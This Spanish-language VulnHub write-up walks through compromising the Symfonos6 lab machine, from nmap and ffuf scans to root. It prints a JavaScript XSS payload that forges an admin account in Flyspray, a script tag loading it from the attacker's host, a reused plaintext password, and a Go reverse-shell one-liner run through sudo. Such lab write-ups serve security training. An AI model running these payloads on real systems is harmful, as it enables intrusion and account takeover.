---
layout: single
title: Symfonos6 - VulnHub
excerpt: "Symfonos6, una máquina vulnerable en VulnHub, presenta una vulnerabilidad XSS que nos habilita para crear un usuario con privilegios elevados, que  permite ver un sector en el que se aloja credenciales válidas para gitea. Posteriormente, aprovechamos los hooks para la ejecución de comandos. Una vez dentro del sistema, accedemos con las credenciales de 'achilles', ya que se reutilizan contraseñas. La escalada a root se logra debido a una configuración incorrecta de los permisos en el archivo sudoers."
date: 2023-11-05
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - rpcbind
  - mount
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)

Symfonos6, una máquina vulnerable en VulnHub, presenta una vulnerabilidad XSS que nos habilita para crear un usuario con privilegios elevados, que  permite ver un sector en el que se aloja credenciales válidas para gitea. Posteriormente, aprovechamos los hooks para la ejecución de comandos. Una vez dentro del sistema, accedemos con las credenciales de 'achilles', ya que se reutilizan contraseñas. La escalada a root se logra debido a una configuración incorrecta de los permisos en el archivo sudoers.


## Enumeración

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```bash
# Nmap 7.93 scan initiated Fri Nov  3 14:07:58 2023 as: nmap -sCV -p22,80,3000,3306,5000 -oN vulnscan.nmap 192.168.56.17
Nmap scan report for 192.168.56.17
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 0ead33fc1a1e8554641339146809c170 (RSA)
|   256 54039b4855deb32b0a78904ab31ffacd (ECDSA)
|_  256 4e0ce63d5c0809f4114885a2e7fb8fb7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=ca676f3920064c7b; Path=/; HttpOnly
|     Set-Cookie: _csrf=I6W0CkrmmfGkvpSAgwydCnquduE6MTY5OTAyMDQ4Mzk3ODcwMzU3OA; Path=/; Expires=Sat, 04 Nov 2023 14:08:03 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 03 Nov 2023 14:08:03 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|     console.info('ServiceWorker registration successful with scope: ', registrat
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=dc5b68385d68749b; Path=/; HttpOnly
|     Set-Cookie: _csrf=mIzB4Q8hYM7r5t_vit1OKylD43M6MTY5OTAyMDQ4OTAyODQxOTIwMg; Path=/; Expires=Sat, 04 Nov 2023 14:08:09 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 03 Nov 2023 14:08:09 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|_    console.info('ServiceWorker registration successful
3306/tcp open  mysql   MariaDB (unauthorized)
5000/tcp open  upnp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Fri, 03 Nov 2023 14:08:34 GMT
|     Content-Length: 18
|     page not found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Fri, 03 Nov 2023 14:08:03 GMT
|     Content-Length: 18
|     page not found
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Fri, 03 Nov 2023 14:08:19 GMT
|     Content-Length: 18
|_    page not found
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.93%I=7%D=11/3%Time=654528F5%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=ca676f3920064c7b;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=I6W0CkrmmfGkvpSAgwydCnq
SF:uduE6MTY5OTAyMDQ4Mzk3ODcwMzU3OA;\x20Path=/;\x20Expires=Sat,\x2004\x20No
SF:v\x202023\x2014:08:03\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
SF:IGIN\r\nDate:\x20Fri,\x2003\x20Nov\x202023\x2014:08:03\x20GMT\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en-US\">\n<head\x20data-suburl=\"\">\
SF:n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"viewport\"\x20content
SF:=\"width=device-width,\x20initial-scale=1\">\n\t<meta\x20http-equiv=\"x
SF:-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>\x20Symfonos6</title
SF:>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorig
SF:in=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x20\('serviceWorker'\x2
SF:0in\x20navigator\)\x20{\n\t\t\tnavigator\.serviceWorker\.register\('/se
SF:rviceworker\.js'\)\.then\(function\(registration\)\x20{\n\t\t\t\t\n\t\t
SF:\t\tconsole\.info\('ServiceWorker\x20registration\x20successful\x20with
SF:\x20scope:\x20',\x20registrat")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,1000,"HTTP/1\.0\x
SF:20404\x20Not\x20Found\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r
SF:\nSet-Cookie:\x20lang=en-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Co
SF:okie:\x20i_like_gitea=dc5b68385d68749b;\x20Path=/;\x20HttpOnly\r\nSet-C
SF:ookie:\x20_csrf=mIzB4Q8hYM7r5t_vit1OKylD43M6MTY5OTAyMDQ4OTAyODQxOTIwMg;
SF:\x20Path=/;\x20Expires=Sat,\x2004\x20Nov\x202023\x2014:08:09\x20GMT;\x2
SF:0HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2003\x20N
SF:ov\x202023\x2014:08:09\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en-US\">\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n
SF:\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initia
SF:l-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie
SF:=edge\">\n\t<title>Page\x20Not\x20Found\x20-\x20\x20Symfonos6</title>\n
SF:\t<link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=
SF:\"use-credentials\">\n\t\n\t<script>\n\t\tif\x20\('serviceWorker'\x20in
SF:\x20navigator\)\x20{\n\t\t\tnavigator\.serviceWorker\.register\('/servi
SF:ceworker\.js'\)\.then\(function\(registration\)\x20{\n\t\t\t\t\n\t\t\t\
SF:tconsole\.info\('ServiceWorker\x20registration\x20successful\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.93%I=7%D=11/3%Time=654528F5%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,7F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConten
SF:t-Type:\x20text/plain\r\nDate:\x20Fri,\x2003\x20Nov\x202023\x2014:08:03
SF:\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20page\x20not\x20found")%r
SF:(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(HTTPOptions,7F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCon
SF:tent-Type:\x20text/plain\r\nDate:\x20Fri,\x2003\x20Nov\x202023\x2014:08
SF::19\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20page\x20not\x20found"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(FourOhFourRequest,7F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCo
SF:ntent-Type:\x20text/plain\r\nDate:\x20Fri,\x2003\x20Nov\x202023\x2014:0
SF:8:34\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20page\x20not\x20found
SF:")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request");
MAC Address: 08:00:27:89:07:36 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  3 14:09:32 2023 -- 1 IP address (1 host up) scanned in 93.83 seconds
```

## Analisis 

Empezamos por los puertos centrales que son 80(http), y 3000(http). El puerto 5000 también es un servidor web, pero a la hora de la enumeración no se ha encontrado nada.En el puerto 3000 podemos observar un gitea.

![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-gitea.png)

Si nos dirigimos a explore, observamos dos usuarios.

![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-usuarios.png)

Como la información encontrada no es útil para seguir avanzando, pasamos a realizar un fuzzing en el servidor 80(http).

```bash
➜  symfonos-6 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.17/FUZZ -e .txt,.html,.txt -t 100 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.17/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 251, Words: 26, Lines: 22, Duration: 12ms]
posts                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 32ms]
.html                   [Status: 403, Size: 207, Words: 15, Lines: 9, Duration: 54ms]
                        [Status: 200, Size: 251, Words: 26, Lines: 22, Duration: 175ms]
:: Progress: [882184/882184] :: Job [1/1] :: 894 req/sec :: Duration: [0:10:12] :: Errors: 0 ::
```

En el directorio posts, no muestra información interesante que nos pueda llegar a servir. Por lo que decido utilizar un diccionario mas amplio que es el : /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 

```bash
➜  symfonos-6 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.56.17/FUZZ -e .txt,.html,.txt -t 100 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.17/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Extensions       : .txt .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 251, Words: 26, Lines: 22, Duration: 24ms]
posts                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 0ms]
                        [Status: 200, Size: 251, Words: 26, Lines: 22, Duration: 39ms]
.html                   [Status: 403, Size: 207, Words: 15, Lines: 9, Duration: 108ms]
logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html [Status: 403, Size: 458, Words: 15, Lines: 9, Duration: 188ms]
flyspray                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 34ms]
```

Encontramos un directorio que esta corriendo flyspray

![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-bugs.png)

 Si buscamos exploits para dicho servicio podemos observar que podemos crear un usuario con altos privilegios.

![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-exploit.png)

El exploit nos indica que hay una vulnerabilidad en el campo Real Name que esta en profile.


![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-js.png)

Procedemos de la siguiente manera: editamos el código proporcionado en exploitdb, ya que está mal programado. Copiamos el siguiente código en un archivo .js para corregirlo.

```bash

➜  content cats hacking.js 
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form" action="index.php?do=admin&area=newuser">';
txt += '<input type="hidden" name="action" value="admin.newuser"/>';
txt += '<input type="hidden" name="do" value="admin"/>';
txt += '<input type="hidden" name="area" value="newuser"/>';
txt += '<input type="hidden" name="user_name" value="hacker"/>';
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>';
txt += '<input type="hidden" name="user_pass" value="12345678"/>';
txt += '<input type="hidden" name="user_pass2" value="12345678"/>';
txt += '<input type="hidden" name="real_name" value="root"/>';
txt += '<input type="hidden" name="email_address" value="root@root.com"/>';
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>';
txt += '<input type="hidden" name="jabber_id" value=""/>';
txt += '<input type="hidden" name="notify_type" value="0"/>';
txt += '<input type="hidden" name="time_zone" value="0"/>';
txt += '<input type="hidden" name="group_in" value="1"/>';
txt += '</form>';

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
```

En el campo Real Name copiamos el siguiente payload.

```bash
"><script SRC=http://192.168.56.1/hacking.js></script>
```

Ahora iniciamos la escucha con 'python3 -m http.server' en el directorio que contiene nuestro archivo 'hacking.js'. Después de guardar el payload en 'Real Name', procedemos a insertar un comentario para ejecutar nuestro código. Personalmente, lo ingresé antes de cambiar el 'Real Name' para evitar errores.

![](/assets/images/vulnhub-writeup-symfonos6/comentario.png)

Una vez que nos llego esta solicitud a nuestro servidor python, probamos las credenciales hacker:12345678.


![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-solicitud.png)

Correcto, ahora hacemos click en "self hosted git service", y vemos unas credenciales. Que lo usaremos para logearnos en gitea.

![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-credenciales.png)

Antes de analizar el repositorio, nos dirigimos a las configuraciones y verificamos si la opción 'post-receive' en los ganchos de Git está habilitada. Observamos que sí lo está.

![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-rcegitea.png)

Por lo que adentro de post-receive escribiremos lo siguiente.

![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-attack.png)

Descargamos el repositorio, ingresamos y ejecutamos lo siguiente.

![](/assets/images/vulnhub-writeup-symfonos6/symfonos6-parterce.png)

Una vez adentro nos logeamos como achilles ya que reutiliza la misma contraseña que gitea.

```js

[git@symfonos6 symfonos-blog.git]$ su achilles
Password: h2sBr9gryBunKdF9
[achilles@symfonos6 symfonos-blog.git]$ 

```

Si ejecutamos sudo -l vemos algo interesante.

```bash
[achilles@symfonos6 symfonos-blog.git]$ sudo -l
Matching Defaults entries for achilles on symfonos6:
    !visiblepw, always_set_home, match_group_by_gid, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User achilles may run the following commands on symfonos6:
    (ALL) NOPASSWD: /usr/local/go/bin/go
```

Copiamos lo siguiente en un archivo.

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.56.1:443");cmd:=exec.Command("bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

Ejecutamos lo siguiente.


```bash
[achilles@symfonos6 symfonos-blog.git]$ sudo -u root /usr/local/go/bin/go run /tmp/t.go
```


## Shell - root 

Finalizamos la máquina con acceso a root.

![](/assets/images/vulnhub-writeup-symfonos6/symfonos-root.png)


